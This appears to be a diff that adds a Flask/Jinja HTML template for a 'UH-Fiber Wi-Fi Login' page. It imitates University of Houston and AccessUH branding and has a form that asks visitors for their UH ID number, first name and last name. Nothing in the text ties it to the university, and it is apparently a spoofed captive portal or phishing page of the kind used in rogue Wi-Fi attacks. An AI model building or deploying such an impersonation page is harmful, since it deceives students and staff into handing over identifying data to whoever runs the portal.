@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>UH-Fiber Wi-Fi Login</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/bootstrap.min.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/all.min.css') }}">
+    <script src="{{ url_for('static', filename='js/jquery.min.js') }}"></script>
+    <script src="{{ url_for('static', filename='js/bootstrap.min.js') }}"></script>
+    <style>
+        body { font-family: sans-serif; }
+        .uh-header { background-color: #c8102e; color: white; padding: 10px 0; }
+        .uh-header .container { display: flex; justify-content: center; align-items: center; }
+        .uh-header img { height: 30px; margin-right: 15px; }
+        .site-nav { background-color: #a00; color: white; padding: 10px 0; }
+        .site-nav ul { list-style: none; padding: 0; display: flex; justify-content: center; }
+        .site-nav li { margin-right: 20px; }
+        .site-nav a, .uh-header a, .uh-footer a { color: white; text-decoration: none; }
+        .container { width: 90%; max-width: 1200px; margin: 0 auto; }
+        .nav-secondary { padding: 20px; }
+        .tab-content { border: 1px solid #ddd; padding: 20px; }
+        .nav-tabs { border-bottom: none; display: flex; }
+        .nav-tabs li a { border: 1px solid #ddd; }
+        .form-group { margin-bottom: 15px; }
+        .form-group input { width: 100%; padding: 10px; border: 1px solid #ccc; }
+        .btn-primary { background-color: #c8102e; color: white; border: none; padding: 10px 15px; cursor: pointer; }
+        .uh-footer { background-color: #333; color: white; padding: 20px 0; text-align: center; }
+    </style>
+</head>
+<body>
+    <header class="uh-header">
+        <div class="container">
+            <a href="http://www.uh.edu/">
+                <img alt="University of Houston" src="{{ url_for('static', filename='image/uh-secondary.svg') }}"/>
+            </a>
+        </div>
+    </header>
+
+    <nav class="site-nav">
+        <div class="container">
+            <ul>
+                <li><a href="#"><i class="fas fa-list"></i> List of Services</a></li>
+                <li><a href="#"><i class="fas fa-question-circle"></i> About AccessUH</a></li>
+                <li><a href="#"><i class="fas fa-info-circle"></i> AccessUH Support</a></li>
+                <li><a href="#"><i class="fas fa-plus"></i> Request a New Service</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <main class="container">
+        <section class="row">
+            <div class="col-md-3 col-sm-5">
+                <div class="panel panel-default">
+                    <div class="panel-heading">Help</div>
+                    <div class="panel-body">
+                        <ul>
+                            <li><a href="#">AccessUH FAQs</a></li>
+                            <li><a href="#">Reset CougarNet Password</a></li>
+                            <li><a href="#">Reset myUH Password</a></li>
+                            <li><a href="#">Live Chat with IT</a></li>
+                            <li><a href="tel:713-743-1411">Call 713-743-1411</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-md-6 col-sm-7">
+                <form method="POST" autocomplete="off">
+                    <ul class="nav nav-tabs">
+                        <li class="active">
+                            <a href="#cougarnet-login" data-toggle="tab">UH Fiber Wi-Fi Login</a>
+                        </li>
+                    </ul>
+                    <div class="tab-content">
+                        <div class="tab-pane active" id="cougarnet-login">
+                            <div class="form-group">
+                                <label for="uid" class="sr-only">UH ID</label>
+                                <input type="text" id="uid" name="uid" placeholder="UH ID Number" class="form-control" required />
+                            </div>
+                            <div class="form-group">
+                                <label for="fname" class="sr-only">First Name</label>
+                                <input type="text" id="fname" name="fname" placeholder="First Name" class="form-control" required />
+                            </div>
+                            <div class="form-group">
+                                <label for="lname" class="sr-only">Last Name</label>
+                                <input type="text" id="lname" name="lname" placeholder="Last Name" class="form-control" required />
+                            </div>
+                            <input type="submit" class="btn btn-primary" value="Login" />
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </section>
+    </main>
+
+    <footer class="uh-footer">
+        <div class="container">
+            <p>&#169;2025 University of Houston. All rights reserved.</p>
+        </div>
+    </footer>
+</body>
+</html>
